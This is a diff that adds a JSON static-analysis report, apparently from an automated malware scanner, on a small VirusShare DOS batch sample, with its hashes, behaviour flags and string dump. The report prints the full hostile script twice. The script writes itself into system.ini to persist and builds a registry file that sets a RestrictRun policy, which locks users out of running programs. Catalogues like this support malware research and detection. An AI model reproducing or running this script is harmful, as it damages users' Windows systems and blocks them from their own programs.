@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "WINDOWS": "May enumerate application windows",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "@echo off\ncopy|echo [boot]>>%windir%\\system.ini\ncopy|echo 2.bat>>%windir%\\system.ini\n\necho @echo off>%windir%\\2.bat\ncopy|echo start %WINDIR%\\rs.reg>>%windir%\\2.bat\n\necho HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLCIES\\RESTRICTRUN>%WINDIR%\\RS.REG\n\nCOPY|ECHO DWORD=00000001>>%WINDIR%\\RS.REG "
+    },
+    "filename": "VirusShare_0be5397a56c5fc5e0bc02baaa0d4aa0d",
+    "filesize": 318,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0be5397a56c5fc5e0bc02baaa0d4aa0d",
+        "sha1": "2efe99577c00ff5f5e727d77bdcfc3167cb0f70f",
+        "sha256": "5f89d2269a41c9c8705c360989efe084a424d3feee15481f10b7108440298370"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "copy|echo [boot]>>%windir%\\system.ini",
+            "copy|echo 2.bat>>%windir%\\system.ini",
+            "echo @echo off>%windir%\\2.bat",
+            "copy|echo start %WINDIR%\\rs.reg>>%windir%\\2.bat",
+            "echo HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLCIES\\RESTRICTRUN>%WINDIR%\\RS.REG",
+            "COPY|ECHO DWORD=00000001>>%WINDIR%\\RS.REG "
+        ],
+        "file": {
+            "echo HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLCIES\\RESTRICTRUN>%WINDIR%\\RS.REG": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.259280",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
